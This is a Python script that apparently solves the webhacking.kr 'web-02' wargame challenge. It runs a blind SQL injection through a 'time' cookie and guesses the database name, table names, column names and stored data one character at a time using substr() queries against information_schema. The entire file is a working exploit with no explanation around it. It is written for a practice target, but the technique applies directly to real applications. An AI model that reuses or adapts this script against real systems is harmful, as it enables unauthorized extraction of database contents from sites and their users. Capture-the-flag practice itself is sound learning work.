import requests as req

def HttpRequest(d_name=None,c_name=None,t_name=None):
	global ch
	value=''
	for i in range(1,20):
		for key in keyword:
			if ch==0:
				cookies['time'] = 'substr((select database()),{},1)="{}"'.format(i,key)
			elif ch==1:
				cookies['time'] = 'substr((select group_concat(table_name) from information_schema.tables \
				where table_schema="{}"),{},1)="{}"'.format(db_name,i,key)
			elif ch==2:
				cookies['time'] = 'substr((select group_concat(column_name) from information_schema.columns where \
				table_name="{}"),{},1)="{}"'.format(table_name,i,key)
			elif ch==3:
				cookies['time'] = 'substr((select {} from {}),{},1)="{}"'.format(column_name,table_name,i,key)
			res = req.get(url,headers=headers,cookies=cookies)
			
			if "09:00:01" in res.text:
				value+=key
				print(value)
				break
			if key == '0':
				print("END")
				ch+=1
				return value
	
if __name__ == '__main__':
	url = 'https://webhacking.kr/challenge/web-02/'
	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
	            AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117'}
	cookies = {'PHPSESSID':'자기세션'}
	keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
	ch=0
	db_name = HttpRequest()
	table_name = HttpRequest(d_name=db_name)
	column_name = HttpRequest(t_name=table_name)
	data = HttpRequest(c_name=column_name,t_name=table_name)

	print("============================")
	print("DB NAME = "+db_name)
	print("TABLE NAME = "+table_name)
	print("COLUMN NAME = "+column_name)
	print("data = "+data)
	print("============================")